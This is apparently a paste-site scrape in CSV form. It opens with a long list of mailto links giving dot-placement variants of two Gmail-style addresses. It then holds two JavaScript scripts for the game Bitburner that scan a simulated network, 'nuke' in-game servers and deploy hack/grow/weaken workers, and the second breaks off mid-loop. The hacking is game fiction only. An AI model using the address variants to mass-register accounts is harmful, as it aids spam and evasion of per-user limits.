<a href=""mailto:b.an.k.of5.45@googlemail.com"">b.an.k.of5.45@googlemail.com</a>
<a href=""mailto:ban.k.of.5.45@googlemail.com"">ban.k.of.5.45@googlemail.com</a>
<a href=""mailto:ba.n.k.o.f.5.4.5@googlemail.com"">ba.n.k.o.f.5.4.5@googlemail.com</a>
<a href=""mailto:bankof.5.45@googlemail.com"">bankof.5.45@googlemail.com</a>
<a href=""mailto:ban.k.o.f545@googlemail.com"">ban.k.o.f545@googlemail.com</a>
<a href=""mailto:b.a.n.k.of.545@googlemail.com"">b.a.n.k.of.545@googlemail.com</a>
<a href=""mailto:bank.of5.4.5@googlemail.com"">bank.of5.4.5@googlemail.com</a>
<a href=""mailto:b.a.nko.f.54.5@googlemail.com"">b.a.nko.f.54.5@googlemail.com</a>
<a href=""mailto:b.ank.o.f.5.45@googlemail.com"">b.ank.o.f.5.45@googlemail.com</a>
<a href=""mailto:b.a.n.k.of54.5@googlemail.com"">b.a.n.k.of54.5@googlemail.com</a>
<a href=""mailto:ba.n.ko.f.5.45@googlemail.com"">ba.n.ko.f.5.45@googlemail.com</a>
<a href=""mailto:b.a.n.k.o.f545@googlemail.com"">b.a.n.k.o.f545@googlemail.com</a>
<a href=""mailto:b.a.nk.of.5.45@googlemail.com"">b.a.nk.of.5.45@googlemail.com</a>
<a href=""mailto:bank.o.f.545@googlemail.com"">bank.o.f.545@googlemail.com</a>
<a href=""mailto:ba.n.k.of.54.5@googlemail.com"">ba.n.k.of.54.5@googlemail.com</a>
<a href=""mailto:b.ankof.545@googlemail.com"">b.ankof.545@googlemail.com</a>
<a href=""mailto:bank.of5.45@googlemail.com"">bank.of5.45@googlemail.com</a>
<a href=""mailto:b.a.n.kof.54.5@googlemail.com"">b.a.n.kof.54.5@googlemail.com</a>
<a href=""mailto:ban.k.o.f54.5@googlemail.com"">ban.k.o.f54.5@googlemail.com</a>
<a href=""mailto:b.a.n.kof.545@googlemail.com"">b.a.n.kof.545@googlemail.com</a>
<a href=""mailto:ban.k.o.f5.4.5@googlemail.com"">ban.k.o.f5.4.5@googlemail.com</a>
<a href=""mailto:bank.o.f5.45@googlemail.com"">bank.o.f5.45@googlemail.com</a>
<a href=""mailto:ba.nkof5.45@googlemail.com"">ba.nkof5.45@googlemail.com</a>
<a href=""mailto:b.a.n.ko.f.5.45@googlemail.com"">b.a.n.ko.f.5.45@googlemail.com</a>
<a href=""mailto:bank.of.54.5@googlemail.com"">bank.of.54.5@googlemail.com</a>
<a href=""mailto:b.an.k.o.f545@googlemail.com"">b.an.k.o.f545@googlemail.com</a>
<a href=""mailto:ba.n.ko.f.54.5@googlemail.com"">ba.n.ko.f.54.5@googlemail.com</a>
<a href=""mailto:ban.ko.f5.45@googlemail.com"">ban.ko.f5.45@googlemail.com</a>
<a href=""mailto:ban.ko.f545@googlemail.com"">ban.ko.f545@googlemail.com</a>
<a href=""mailto:bank.o.f5.4.5@googlemail.com"">bank.o.f5.4.5@googlemail.com</a>
<a href=""mailto:bank.o.f.5.45@googlemail.com"">bank.o.f.5.45@googlemail.com</a>
<a href=""mailto:ba.n.kof.5.45@googlemail.com"">ba.n.kof.5.45@googlemail.com</a>
<a href=""mailto:b.a.nk.of54.5@googlemail.com"">b.a.nk.of54.5@googlemail.com</a>
<a href=""mailto:ba.nko.f.5.45@googlemail.com"">ba.nko.f.5.45@googlemail.com</a>
<a href=""mailto:ba.n.kof.545@googlemail.com"">ba.n.kof.545@googlemail.com</a>
<a href=""mailto:ba.nk.o.f.5.4.5@googlemail.com"">ba.nk.o.f.5.4.5@googlemail.com</a>
<a href=""mailto:b.ankof.54.5@googlemail.com"">b.ankof.54.5@googlemail.com</a>
<a href=""mailto:b.a.n.k.o.f.5.45@googlemail.com"">b.a.n.k.o.f.5.45@googlemail.com</a>
<a href=""mailto:b.a.n.kof5.4.5@googlemail.com"">b.a.n.kof5.4.5@googlemail.com</a>
<a href=""mailto:b.ank.of.545@googlemail.com"">b.ank.of.545@googlemail.com</a>
<a href=""mailto:ba.nkof.54.5@googlemail.com"">ba.nkof.54.5@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f.5.4.5@googlemail.com"">b.a.nk.o.f.5.4.5@googlemail.com</a>
<a href=""mailto:b.ank.o.f5.4.5@googlemail.com"">b.ank.o.f5.4.5@googlemail.com</a>
<a href=""mailto:ba.nk.of5.45@googlemail.com"">ba.nk.of5.45@googlemail.com</a>
<a href=""mailto:b.an.kof5.45@googlemail.com"">b.an.kof5.45@googlemail.com</a>
<a href=""mailto:ban.kof.54.5@googlemail.com"">ban.kof.54.5@googlemail.com</a>
<a href=""mailto:b.ank.of.5.45@googlemail.com"">b.ank.of.5.45@googlemail.com</a>
<a href=""mailto:ba.n.k.of.5.45@googlemail.com"">ba.n.k.of.5.45@googlemail.com</a>
<a href=""mailto:bank.o.f.5.4.5@googlemail.com"">bank.o.f.5.4.5@googlemail.com</a>
<a href=""mailto:ba.n.kof545@googlemail.com"">ba.n.kof545@googlemail.com</a>
<a href=""mailto:b.a.n.k.o.f5.4.5@googlemail.com"">b.a.n.k.o.f5.4.5@googlemail.com</a>
<a href=""mailto:b.ank.o.f5.45@googlemail.com"">b.ank.o.f5.45@googlemail.com</a>
<a href=""mailto:ban.ko.f.54.5@googlemail.com"">ban.ko.f.54.5@googlemail.com</a>
<a href=""mailto:b.ankof.5.45@googlemail.com"">b.ankof.5.45@googlemail.com</a>
<a href=""mailto:b.ank.o.f.54.5@googlemail.com"">b.ank.o.f.54.5@googlemail.com</a>
<a href=""mailto:b.an.k.of54.5@googlemail.com"">b.an.k.of54.5@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f.545@googlemail.com"">b.a.nk.o.f.545@googlemail.com</a>
<a href=""mailto:b.an.k.of.545@googlemail.com"">b.an.k.of.545@googlemail.com</a>
<a href=""mailto:bankof0009@googlemail.com"">bankof0009@googlemail.com</a>
<a href=""mailto:ba.nko.f.00.0.9@googlemail.com"">ba.nko.f.00.0.9@googlemail.com</a>
<a href=""mailto:b.ankof.0009@googlemail.com"">b.ankof.0009@googlemail.com</a>
<a href=""mailto:ba.nk.o.f0.0.0.9@googlemail.com"">ba.nk.o.f0.0.0.9@googlemail.com</a>
<a href=""mailto:b.an.k.o.f.0.0.0.9@googlemail.com"">b.an.k.o.f.0.0.0.9@googlemail.com</a>
<a href=""mailto:ba.n.kof00.09@googlemail.com"">ba.n.kof00.09@googlemail.com</a>
<a href=""mailto:ba.n.k.of0.0.09@googlemail.com"">ba.n.k.of0.0.09@googlemail.com</a>
<a href=""mailto:ba.n.k.of00.09@googlemail.com"">ba.n.k.of00.09@googlemail.com</a>
<a href=""mailto:b.ank.o.f.00.09@googlemail.com"">b.ank.o.f.00.09@googlemail.com</a>
<a href=""mailto:banko.f.0009@googlemail.com"">banko.f.0009@googlemail.com</a>
<a href=""mailto:b.ankof0.0.0.9@googlemail.com"">b.ankof0.0.0.9@googlemail.com</a>
<a href=""mailto:banko.f0.009@googlemail.com"">banko.f0.009@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f.00.0.9@googlemail.com"">b.a.nk.o.f.00.0.9@googlemail.com</a>
<a href=""mailto:b.a.nkof000.9@googlemail.com"">b.a.nkof000.9@googlemail.com</a>
<a href=""mailto:bankof.0.0.0.9@googlemail.com"">bankof.0.0.0.9@googlemail.com</a>
<a href=""mailto:ba.nkof00.09@googlemail.com"">ba.nkof00.09@googlemail.com</a>
<a href=""mailto:ba.n.ko.f.0.009@googlemail.com"">ba.n.ko.f.0.009@googlemail.com</a>
<a href=""mailto:bank.o.f0.00.9@googlemail.com"">bank.o.f0.00.9@googlemail.com</a>
<a href=""mailto:b.a.n.k.of.0.00.9@googlemail.com"">b.a.n.k.of.0.00.9@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f00.0.9@googlemail.com"">b.a.nk.o.f00.0.9@googlemail.com</a>
<a href=""mailto:b.a.n.k.of.000.9@googlemail.com"">b.a.n.k.of.000.9@googlemail.com</a>
<a href=""mailto:b.an.k.of00.09@googlemail.com"">b.an.k.of00.09@googlemail.com</a>
<a href=""mailto:bank.of.0.00.9@googlemail.com"">bank.of.0.00.9@googlemail.com</a>
<a href=""mailto:bank.of.00.0.9@googlemail.com"">bank.of.00.0.9@googlemail.com</a>
<a href=""mailto:b.a.n.kof.0.0.09@googlemail.com"">b.a.n.kof.0.0.09@googlemail.com</a>
<a href=""mailto:b.a.n.ko.f0009@googlemail.com"">b.a.n.ko.f0009@googlemail.com</a>
<a href=""mailto:ba.nk.o.f.0.00.9@googlemail.com"">ba.nk.o.f.0.00.9@googlemail.com</a>
<a href=""mailto:b.a.nkof.0.00.9@googlemail.com"">b.a.nkof.0.00.9@googlemail.com</a>
<a href=""mailto:ban.k.o.f.0.00.9@googlemail.com"">ban.k.o.f.0.00.9@googlemail.com</a>
<a href=""mailto:ba.nko.f.0.00.9@googlemail.com"">ba.nko.f.0.00.9@googlemail.com</a>
<a href=""mailto:b.an.k.of0.00.9@googlemail.com"">b.an.k.of0.00.9@googlemail.com</a>
<a href=""mailto:b.an.k.of.0.009@googlemail.com"">b.an.k.of.0.009@googlemail.com</a>
<a href=""mailto:ba.nko.f0.0.09@googlemail.com"">ba.nko.f0.0.09@googlemail.com</a>
<a href=""mailto:ba.nk.of000.9@googlemail.com"">ba.nk.of000.9@googlemail.com</a>
<a href=""mailto:ba.n.ko.f.00.0.9@googlemail.com"">ba.n.ko.f.00.0.9@googlemail.com</a>
<a href=""mailto:b.an.kof.0.009@googlemail.com"">b.an.kof.0.009@googlemail.com</a>
<a href=""mailto:b.an.k.of.00.0.9@googlemail.com"">b.an.k.of.00.0.9@googlemail.com</a>
<a href=""mailto:ba.nkof0.0.09@googlemail.com"">ba.nkof0.0.09@googlemail.com</a>
<a href=""mailto:ba.n.kof.0.0.09@googlemail.com"">ba.n.kof.0.0.09@googlemail.com</a>
<a href=""mailto:b.an.k.o.f00.09@googlemail.com"">b.an.k.o.f00.09@googlemail.com</a>
<a href=""mailto:b.ankof.0.0.0.9@googlemail.com"">b.ankof.0.0.0.9@googlemail.com</a>
<a href=""mailto:bank.o.f.0009@googlemail.com"">bank.o.f.0009@googlemail.com</a>
<a href=""mailto:b.an.k.of.0.0.09@googlemail.com"">b.an.k.of.0.0.09@googlemail.com</a>
<a href=""mailto:ban.k.of.0009@googlemail.com"">ban.k.of.0009@googlemail.com</a>
<a href=""mailto:b.ank.of.00.09@googlemail.com"">b.ank.of.00.09@googlemail.com</a>
<a href=""mailto:b.an.ko.f.000.9@googlemail.com"">b.an.ko.f.000.9@googlemail.com</a>
<a href=""mailto:bank.o.f.00.09@googlemail.com"">bank.o.f.00.09@googlemail.com</a>
<a href=""mailto:bank.o.f00.09@googlemail.com"">bank.o.f00.09@googlemail.com</a>
<a href=""mailto:b.ank.o.f.0.009@googlemail.com"">b.ank.o.f.0.009@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f0009@googlemail.com"">b.a.nk.o.f0009@googlemail.com</a>
<a href=""mailto:ba.n.ko.f.0009@googlemail.com"">ba.n.ko.f.0009@googlemail.com</a>
<a href=""mailto:b.an.kof.0.0.09@googlemail.com"">b.an.kof.0.0.09@googlemail.com</a>
<a href=""mailto:ba.nk.o.f000.9@googlemail.com"">ba.nk.o.f000.9@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f000.9@googlemail.com"">b.a.nk.o.f000.9@googlemail.com</a>
<a href=""mailto:b.a.n.k.o.f.0.00.9@googlemail.com"">b.a.n.k.o.f.0.00.9@googlemail.com</a>
<a href=""mailto:ba.n.ko.f0.0.09@googlemail.com"">ba.n.ko.f0.0.09@googlemail.com</a>
<a href=""mailto:ban.k.of00.09@googlemail.com"">ban.k.of00.09@googlemail.com</a>
<a href=""mailto:banko.f00.09@googlemail.com"">banko.f00.09@googlemail.com</a>
<a href=""mailto:ban.kof0.0.09@googlemail.com"">ban.kof0.0.09@googlemail.com</a>
<a href=""mailto:b.a.n.k.of0.009@googlemail.com"">b.a.n.k.of0.009@googlemail.com</a>
<a href=""mailto:ba.n.ko.f00.0.9@googlemail.com"">ba.n.ko.f00.0.9@googlemail.com</a>
<a href=""mailto:ban.ko.f.0.009@googlemail.com"">ban.ko.f.0.009@googlemail.com</a>
<a href=""mailto:b.ank.o.f0.0.0.9@googlemail.com"">b.ank.o.f0.0.0.9@googlemail.com</a>
<a href=""mailto:ban.k.of.00.09@googlemail.com"">ban.k.of.00.09@googlemail.com</a>
<a href=""mailto:ba.n.k.o.f.0.0.0.9@googlemail.com"">ba.n.k.o.f.0.0.0.9@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f0.0.09@googlemail.com"">b.a.nk.o.f0.0.09@googlemail.com</a>
<a href=""mailto:b.a.nk.of.0009@googlemail.com"">b.a.nk.of.0009@googlemail.com</a>
<a href=""mailto:b.anko.f0.0.0.9@googlemail.com"">b.anko.f0.0.0.9@googlemail.com</a>
<a href=""mailto:b.an.k.of0.009@googlemail.com"">b.an.k.of0.009@googlemail.com</a>
<a href=""mailto:b.a.n.k.of00.0.9@googlemail.com"">b.a.n.k.of00.0.9@googlemail.com</a>
<a href=""mailto:ba.nk.of.0.009@googlemail.com"">ba.nk.of.0.009@googlemail.com</a>
<a href=""mailto:bank.of.0.009@googlemail.com"">bank.of.0.009@googlemail.com</a>
<a href=""mailto:ba.nko.f000.9@googlemail.com"">ba.nko.f000.9@googlemail.com</a>
<a href=""mailto:b.a.n.k.of00.09@googlemail.com"">b.a.n.k.of00.09@googlemail.com</a>
<a href=""mailto:b.a.n.kof000.9@googlemail.com"">b.a.n.kof000.9@googlemail.com</a>
<a href=""mailto:b.a.nk.of.00.09@googlemail.com"">b.a.nk.of.00.09@googlemail.com</a>
<a href=""mailto:ba.n.k.of.000.9@googlemail.com"">ba.n.k.of.000.9@googlemail.com</a>
<a href=""mailto:ban.k.of.0.0.09@googlemail.com"">ban.k.of.0.0.09@googlemail.com</a>
<a href=""mailto:ban.ko.f0.0.09@googlemail.com"">ban.ko.f0.0.09@googlemail.com</a>
<a href=""mailto:b.a.n.k.of.0.0.09@googlemail.com"">b.a.n.k.of.0.0.09@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f.0.0.0.9@googlemail.com"">b.a.nk.o.f.0.0.0.9@googlemail.com</a>
<a href=""mailto:ba.n.k.of.0.00.9@googlemail.com"">ba.n.k.of.0.00.9@googlemail.com</a>
<a href=""mailto:b.a.n.ko.f.0.0.09@googlemail.com"">b.a.n.ko.f.0.0.09@googlemail.com</a>
<a href=""mailto:b.anko.f.0.009@googlemail.com"">b.anko.f.0.009@googlemail.com</a>
<a href=""mailto:b.a.nkof00.0.9@googlemail.com"">b.a.nkof00.0.9@googlemail.com</a>
<a href=""mailto:b.ank.of.0009@googlemail.com"">b.ank.of.0009@googlemail.com</a>
<a href=""mailto:b.ank.of.00.0.9@googlemail.com"">b.ank.of.00.0.9@googlemail.com</a>
<a href=""mailto:b.a.nkof0.009@googlemail.com"">b.a.nkof0.009@googlemail.com</a>
<a href=""mailto:b.ank.o.f.000.9@googlemail.com"">b.ank.o.f.000.9@googlemail.com</a>
<a href=""mailto:ba.n.ko.f.0.0.09@googlemail.com"">ba.n.ko.f.0.0.09@googlemail.com</a>
<a href=""mailto:b.a.nk.of0.0.09@googlemail.com"">b.a.nk.of0.0.09@googlemail.com</a>
<a href=""mailto:b.ank.of00.0.9@googlemail.com"">b.ank.of00.0.9@googlemail.com</a>
<a href=""mailto:b.a.n.kof.0.0.0.9@googlemail.com"">b.a.n.kof.0.0.0.9@googlemail.com</a>
<a href=""mailto:ban.ko.f00.0.9@googlemail.com"">ban.ko.f00.0.9@googlemail.com</a>
<a href=""mailto:b.a.n.ko.f.0.0.0.9@googlemail.com"">b.a.n.ko.f.0.0.0.9@googlemail.com</a>
<a href=""mailto:ban.k.of0.0.0.9@googlemail.com"">ban.k.of0.0.0.9@googlemail.com</a>
<a href=""mailto:b.a.n.kof00.09@googlemail.com"">b.a.n.kof00.09@googlemail.com</a>
<a href=""mailto:b.an.k.of.0.0.0.9@googlemail.com"">b.an.k.of.0.0.0.9@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f.000.9@googlemail.com"">b.a.nk.o.f.000.9@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f0.00.9@googlemail.com"">b.a.nk.o.f0.00.9@googlemail.com</a>
<a href=""mailto:ban.ko.f00.09@googlemail.com"">ban.ko.f00.09@googlemail.com</a>
<a href=""mailto:b.ank.o.f00.09@googlemail.com"">b.ank.o.f00.09@googlemail.com</a>
<a href=""mailto:b.anko.f.00.09@googlemail.com"">b.anko.f.00.09@googlemail.com</a>
<a href=""mailto:bank.o.f000.9@googlemail.com"">bank.o.f000.9@googlemail.com</a>
<a href=""mailto:ba.nk.o.f00.09@googlemail.com"">ba.nk.o.f00.09@googlemail.com</a>
<a href=""mailto:ba.n.kof0.00.9@googlemail.com"">ba.n.kof0.00.9@googlemail.com</a>
<a href=""mailto:ba.nko.f0.0.0.9@googlemail.com"">ba.nko.f0.0.0.9@googlemail.com</a>
<a href=""mailto:ba.n.k.of0009@googlemail.com"">ba.n.k.of0009@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f.0.00.9@googlemail.com"">b.a.nk.o.f.0.00.9@googlemail.com</a>
<a href=""mailto:b.a.n.kof00.0.9@googlemail.com"">b.a.n.kof00.0.9@googlemail.com</a>
<a href=""mailto:ban.k.o.f.00.09@googlemail.com"">ban.k.o.f.00.09@googlemail.com</a>
<a href=""mailto:b.anko.f000.9@googlemail.com"">b.anko.f000.9@googlemail.com</a>
<a href=""mailto:banko.f00.0.9@googlemail.com"">banko.f00.0.9@googlemail.com</a>
<a href=""mailto:b.ankof.000.9@googlemail.com"">b.ankof.000.9@googlemail.com</a>
<a href=""mailto:b.an.kof000.9@googlemail.com"">b.an.kof000.9@googlemail.com</a>
<a href=""mailto:ban.k.o.f0.009@googlemail.com"">ban.k.o.f0.009@googlemail.com</a>
<a href=""mailto:ba.nkof0.00.9@googlemail.com"">ba.nkof0.00.9@googlemail.com</a>
<a href=""mailto:b.a.n.kof0.0.09@googlemail.com"">b.a.n.kof0.0.09@googlemail.com</a>
<a href=""mailto:ban.kof0009@googlemail.com"">ban.kof0009@googlemail.com</a>
<a href=""mailto:ba.n.kof0.009@googlemail.com"">ba.n.kof0.009@googlemail.com</a>
<a href=""mailto:b.a.n.ko.f0.00.9@googlemail.com"">b.a.n.ko.f0.00.9@googlemail.com</a>
<a href=""mailto:b.anko.f.0.0.09@googlemail.com"">b.anko.f.0.0.09@googlemail.com</a>
<a href=""mailto:b.a.n.kof.000.9@googlemail.com"">b.a.n.kof.000.9@googlemail.com</a>
<a href=""mailto:b.a.n.ko.f.00.0.9@googlemail.com"">b.a.n.ko.f.00.0.9@googlemail.com</a>
<a href=""mailto:ban.k.of0.0.09@googlemail.com"">ban.k.of0.0.09@googlemail.com</a>
<a href=""mailto:b.ank.o.f.0.0.0.9@googlemail.com"">b.ank.o.f.0.0.0.9@googlemail.com</a>
<a href=""mailto:bank.of000.9@googlemail.com"">bank.of000.9@googlemail.com</a>
<a href=""mailto:b.a.n.kof.00.09@googlemail.com"">b.a.n.kof.00.09@googlemail.com</a>
<a href=""mailto:ba.n.k.of.0.0.0.9@googlemail.com"">ba.n.k.of.0.0.0.9@googlemail.com</a>
<a href=""mailto:b.an.ko.f.0.009@googlemail.com"">b.an.ko.f.0.009@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f.0.009@googlemail.com"">b.a.nk.o.f.0.009@googlemail.com</a>
<a href=""mailto:ba.nk.of0.0.0.9@googlemail.com"">ba.nk.of0.0.0.9@googlemail.com</a>
<a href=""mailto:b.a.nkof0009@googlemail.com"">b.a.nkof0009@googlemail.com</a>
<a href=""mailto:b.a.n.k.o.f0.00.9@googlemail.com"">b.a.n.k.o.f0.00.9@googlemail.com</a>
<a href=""mailto:ba.n.kof.0.009@googlemail.com"">ba.n.kof.0.009@googlemail.com</a>
<a href=""mailto:b.anko.f0.009@googlemail.com"">b.anko.f0.009@googlemail.com</a>
<a href=""mailto:b.ank.of0009@googlemail.com"">b.ank.of0009@googlemail.com</a>
<a href=""mailto:b.a.n.ko.f0.0.0.9@googlemail.com"">b.a.n.ko.f0.0.0.9@googlemail.com</a>
<a href=""mailto:b.an.ko.f.0.00.9@googlemail.com"">b.an.ko.f.0.00.9@googlemail.com</a>
<a href=""mailto:bank.of.000.9@googlemail.com"">bank.of.000.9@googlemail.com</a>
<a href=""mailto:ba.n.k.o.f0.0.09@googlemail.com"">ba.n.k.o.f0.0.09@googlemail.com</a>
<a href=""mailto:b.ankof0009@googlemail.com"">b.ankof0009@googlemail.com</a>
<a href=""mailto:bank.o.f0.0.0.9@googlemail.com"">bank.o.f0.0.0.9@googlemail.com</a>
<a href=""mailto:ba.n.ko.f00.09@googlemail.com"">ba.n.ko.f00.09@googlemail.com</a>
<a href=""mailto:ba.n.k.of000.9@googlemail.com"">ba.n.k.of000.9@googlemail.com</a>
<a href=""mailto:ba.nk.o.f0009@googlemail.com"">ba.nk.o.f0009@googlemail.com</a>
<a href=""mailto:bankof.00.09@googlemail.com"">bankof.00.09@googlemail.com</a>
<a href=""mailto:ban.kof0.0.0.9@googlemail.com"">ban.kof0.0.0.9@googlemail.com</a>
<a href=""mailto:b.a.nkof.00.09@googlemail.com"">b.a.nkof.00.09@googlemail.com</a>
<a href=""mailto:bank.o.f.0.009@googlemail.com"">bank.o.f.0.009@googlemail.com</a>
<a href=""mailto:b.a.n.kof.00.0.9@googlemail.com"">b.a.n.kof.00.0.9@googlemail.com</a>
<a href=""mailto:ba.n.k.o.f0.00.9@googlemail.com"">ba.n.k.o.f0.00.9@googlemail.com</a>
<a href=""mailto:b.an.k.of000.9@googlemail.com"">b.an.k.of000.9@googlemail.com</a>
<a href=""mailto:bank.o.f00.0.9@googlemail.com"">bank.o.f00.0.9@googlemail.com</a>
<a href=""mailto:bankof0.009@googlemail.com"">bankof0.009@googlemail.com</a>
<a href=""mailto:b.anko.f.0.00.9@googlemail.com"">b.anko.f.0.00.9@googlemail.com</a>
<a href=""mailto:bank.of0.00.9@googlemail.com"">bank.of0.00.9@googlemail.com</a>
<a href=""mailto:ban.kof.00.0.9@googlemail.com"">ban.kof.00.0.9@googlemail.com</a>
<a href=""mailto:ban.kof.0009@googlemail.com"">ban.kof.0009@googlemail.com</a>
<a href=""mailto:ba.n.k.o.f0009@googlemail.com"">ba.n.k.o.f0009@googlemail.com</a>
<a href=""mailto:b.ankof.00.0.9@googlemail.com"">b.ankof.00.0.9@googlemail.com</a>
<a href=""mailto:b.a.nk.of0.0.0.9@googlemail.com"">b.a.nk.of0.0.0.9@googlemail.com</a>
<a href=""mailto:ban.k.of.000.9@googlemail.com"">ban.k.of.000.9@googlemail.com</a>
<a href=""mailto:bank.of00.0.9@googlemail.com"">bank.of00.0.9@googlemail.com</a>
<a href=""mailto:b.anko.f.0.0.0.9@googlemail.com"">b.anko.f.0.0.0.9@googlemail.com</a>
<a href=""mailto:b.anko.f.0009@googlemail.com"">b.anko.f.0009@googlemail.com</a>
<a href=""mailto:ban.ko.f.0009@googlemail.com"">ban.ko.f.0009@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f0.0.0.9@googlemail.com"">b.a.nk.o.f0.0.0.9@googlemail.com</a>
<a href=""mailto:ba.n.kof.0.0.0.9@googlemail.com"">ba.n.kof.0.0.0.9@googlemail.com</a>
<a href=""mailto:bankof.0009@googlemail.com"">bankof.0009@googlemail.com</a>
<a href=""mailto:ba.nkof00.0.9@googlemail.com"">ba.nkof00.0.9@googlemail.com</a>
<a href=""mailto:bank.o.f0009@googlemail.com"">bank.o.f0009@googlemail.com</a>
<a href=""mailto:ban.ko.f.00.09@googlemail.com"">ban.ko.f.00.09@googlemail.com</a>
<a href=""mailto:b.an.ko.f.0.0.09@googlemail.com"">b.an.ko.f.0.0.09@googlemail.com</a>
<a href=""mailto:b.an.ko.f.00.0.9@googlemail.com"">b.an.ko.f.00.0.9@googlemail.com</a>
<a href=""mailto:ba.n.kof00.0.9@googlemail.com"">ba.n.kof00.0.9@googlemail.com</a>
<a href=""mailto:b.a.n.k.o.f00.0.9@googlemail.com"">b.a.n.k.o.f00.0.9@googlemail.com</a>
<a href=""mailto:ba.n.kof.0.00.9@googlemail.com"">ba.n.kof.0.00.9@googlemail.com</a>
<a href=""mailto:ba.nk.of.0.00.9@googlemail.com"">ba.nk.of.0.00.9@googlemail.com</a>
<a href=""mailto:ba.n.ko.f0009@googlemail.com"">ba.n.ko.f0009@googlemail.com</a>
<a href=""mailto:ba.n.k.o.f.00.09@googlemail.com"">ba.n.k.o.f.00.09@googlemail.com</a>
<a href=""mailto:bankof.0.0.09@googlemail.com"">bankof.0.0.09@googlemail.com</a>
<a href=""mailto:b.an.k.o.f.00.0.9@googlemail.com"">b.an.k.o.f.00.0.9@googlemail.com</a>
<a href=""mailto:banko.f.00.0.9@googlemail.com"">banko.f.00.0.9@googlemail.com</a>
<a href=""mailto:ba.n.k.o.f00.09@googlemail.com"">ba.n.k.o.f00.09@googlemail.com</a>
<a href=""mailto:b.ank.o.f.0.0.09@googlemail.com"">b.ank.o.f.0.0.09@googlemail.com</a>
<a href=""mailto:bank.of.0009@googlemail.com"">bank.of.0009@googlemail.com</a>
<a href=""mailto:b.an.k.of0.0.09@googlemail.com"">b.an.k.of0.0.09@googlemail.com</a>
<a href=""mailto:b.a.n.kof0009@googlemail.com"">b.a.n.kof0009@googlemail.com</a>
<a href=""mailto:b.ank.o.f.0.00.9@googlemail.com"">b.ank.o.f.0.00.9@googlemail.com</a>
<a href=""mailto:ban.k.o.f0.00.9@googlemail.com"">ban.k.o.f0.00.9@googlemail.com</a>
<a href=""mailto:b.ank.o.f.0009@googlemail.com"">b.ank.o.f.0009@googlemail.com</a>
<a href=""mailto:ba.n.ko.f.0.00.9@googlemail.com"">ba.n.ko.f.0.00.9@googlemail.com</a>
<a href=""mailto:b.a.nk.o.f.00.09@googlemail.com"">b.a.nk.o.f.00.09@googlemail.com</a>
<a href=""mailto:ba.n.k.o.f000.9@googlemail.com"">ba.n.k.o.f000.9@googlemail.com</a>
<a href=""mailto:b.an.ko.f0.00.9@googlemail.com"">b.an.ko.f0.00.9@googlemail.com</a>
<a href=""mailto:b.an.k.of.000.9@googlemail.com"">b.an.k.of.000.9@googlemail.com</a>
<a href=""mailto:ban.ko.f0009@googlemail.com"">ban.ko.f0009@googlemail.com</a>
<a href=""mailto:b.an.ko.f000.9@googlemail.com"">b.an.ko.f000.9@googlemail.com</a>
<a href=""mailto:ba.n.kof0009@googlemail.com"">ba.n.kof0009@googlemail.com</a>
<a href=""mailto:b.anko.f00.0.9@googlemail.com"">b.anko.f00.0.9@googlemail.com</a>"
mqmS2JLp,Untitled,tazyload,JavaScript,Monday 4th of December 2023 09:16:23 PM CDT,"/** @param {NS} ns */
export async function main(ns) {
  let rangeMin = ns.args[0];
  let rangeMax = ns.args[1];
  let servers = [];

  let serversToScan = ns.scan(""home"");
  while (serversToScan.length > 0) {
    let server = serversToScan.shift();
    if (!servers.includes(server) && server !== ""home"") {
      servers.push(server);
      serversToScan = serversToScan.concat(ns.scan(server));
    }
  }

  for (let server of servers) {
    if (ns.getServerRequiredHackingLevel(server) > rangeMin && ns.getServerRequiredHackingLevel(server) < rangeMax && ns.getServerMaxMoney(server) > 0) {
      ns.run(""deployer.js"", 1, server);
    } else {
      continue;
    }
  }

}"
fWvUEHej,Untitled,tazyload,JavaScript,Monday 4th of December 2023 07:29:58 PM CDT,"/** @param {NS} ns **/
export async function main(ns) {
  let target = ns.args[0];
  let moneyThresh = ns.getServerMaxMoney(target) * 0.75;
  let securityThresh = ns.getServerMinSecurityLevel(target) + 5;
  let servers = [];
  let ramPerThread = ns.getScriptRam(""/shared/weaken.js"");

  // This is required for later on where I want the targets money printed into the log and actually look nice.
  const formatter = new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',

    // These options are needed to round to whole numbers if that's what you want.
    //minimumFractionDigits: 0, // (this suffices for whole numbers, but will print 2500.10 as $2,500.1)
    maximumFractionDigits: 0, // (causes 2500.99 to be printed as $2,501)
  });

  // This goes through every server, NUKE's it (if we own the needed exploits) and dumps our little
  // worker scripts so we can use them later on.
  let serversToScan = ns.scan(""home"");
  while (serversToScan.length > 0) {
    let server = serversToScan.shift();
    if (!servers.includes(server) && server !== ""home"") {
      servers.push(server);
      serversToScan = serversToScan.concat(ns.scan(server));
      await ns.scp([
        ""/shared/weaken.js"",
        ""/shared/grow.js"",
        ""/shared/hack.js""
      ], server);

      let openPorts = 0;
      if (ns.fileExists(""BruteSSH.exe"")) {
        ns.brutessh(server);
        openPorts++;
      }
      if (ns.fileExists(""FTPCrack.exe"")) {
        ns.ftpcrack(server);
        openPorts++;
      }
      if (ns.fileExists(""RelaySMTP.exe"")) {
        ns.relaysmtp(server);
        openPorts++;
      }
      if (ns.fileExists(""HTTPWorm.exe"")) {
        ns.httpworm(server);
        openPorts++;
      }
      if (ns.fileExists(""SQLInject.exe"")) {
        ns.sqlinject(server);
        openPorts++;
      }
      if (ns.getServerNumPortsRequired(server) <= openPorts) {
        ns.nuke(server);
      }
    }
  }
  // Everything below is the real ""Meat and potatoes"" of the script
  if (ns.hasRootAccess(target)) {

    while (true) {
      let sleepTime = 3000;
      let activeScript = """";
      let targetCurrentMoney = ns.getServerMoneyAvailable(target);
      let targetMaxMoney = ns.getServerMaxMoney(target);
      let targetCurrentSecurity = ns.getServerSecurityLevel(target);
      let targetMaxSecurity = ns.getServerBaseSecurityLevel(target);
      var threadTotal = 0;
      var weakenActive = 0;
      var growActive = 0;
